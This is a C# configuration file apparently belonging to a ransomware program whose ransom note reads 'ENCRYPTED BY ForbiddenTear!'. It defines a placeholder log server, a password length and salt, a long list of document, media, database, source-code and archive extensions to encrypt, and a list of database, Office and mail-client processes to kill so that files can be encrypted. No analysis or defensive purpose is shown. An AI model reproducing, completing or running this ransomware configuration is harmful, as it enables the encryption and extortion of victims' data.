using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;

namespace Main
{
    public static class Settables
    {
        public static readonly ExecutionMode Mode = ExecutionMode.Full;

        public static readonly string URL = "";
        public static readonly string LOGURL = "YOUR_WEB_SERVER";
        public static readonly string CONTAINMENTPATH = "";

        public static readonly int PASSLENGTH = 12;
        public static readonly byte[] SALT = Common.GetRandomBytes(1024);
        public static readonly string[] EXTENTIONS =
        #region extentions
            new[]
            {
                ".txt", ".doc", ".docx", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd", ".wps", ".csv", ".pdf",//Text Files
                ".csv", ".dat", ".ged", ".key", ".keychain", ".pps", ".ppt", ".pptx", ".sdf", ".tar", ".tax2014", ".tax2015", ".vcf", ".xml", //Data Files
                ".aif", ".iff", ".m3u", ".m4a", ".mid", ".mp3", ".mpa", ".wav", ".wma", //Audio Files
                ".3g2", ".3gp", ".asf", ".avi", ".flv", ".m4v", ".mov", ".mp4", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", //Video Files
                ".3dm", ".3ds", ".max", ".obj", //3D Image Files
                ".bmp", ".dds", ".gif", ".jpg", ".png", ".psd", ".tga", ".thm", ".tif", ".tiff", ".yuv", //Raster Image Files
                ".ai", ".eps", ".ps", ".svg", //Vector Image Files
                ".indd", ".pct", ".pdf", //Page Layout Files
                ".xlr", ".xls", ".xlsx", //Spreadsheet Files
                ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", //Database Files
                ".dwg", ".dxf",//CAD Files
                ".asp", ".aspx", ".cer", ".cfm", ".csr", ".css", ".htm", ".html", ".js", ".jsp", ".php", ".rss", ".xhtml", //Web Files
                ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rar", ".rpm", ".sitx", ".tar.gz", ".zip", ".zipx", //Compressed Files
                ".bin", ".cue", ".dmg", ".iso", ".mdf", ".toast", ".vcd", //Disk Image Files
                ".c", ".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".java", ".lua", ".m", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj", //Developer Files
                ".bak", ".tmp", //Backup Files
                ".crdownload", ".ics", ".msi", ".part", ".torrent", //Misc Files
            };      //http://fileinfo.com/filetypes/common
        #endregion

      public static readonly string[] PROCLIST = new []
      {
        "msftesql","sqlagent","sqlbrowser","sqlservr","sqlwriter","oracle","ocssd","dbsnmp","synctime","mydesktopqos","agntsvc.exeisqlplussvc","xfssvccon","mydesktopservice","ocautoupds",
        "agntsvc.exeagntsvc","agntsvc.exeencsvc","firefoxconfig","tbirdconfig","ocomm","mysqld","mysqld-nt","mysqld-opt","dbeng50","sqbcoreservice","excel","infopath","msaccess","mspub",
        "onenote","outlook","powerpnt","steam","sqlservr","thebat","thebat64","thunderbird","visio","winword","wordpad","notepad" //processes that interfere with encryption
      };

      public static readonly string RANSOM_NOTE =
      @" ENCRYPTED BY ForbiddenTear!
      ";
    }


    public enum ExecutionMode
    {
        Fast,
        Full
    }
}
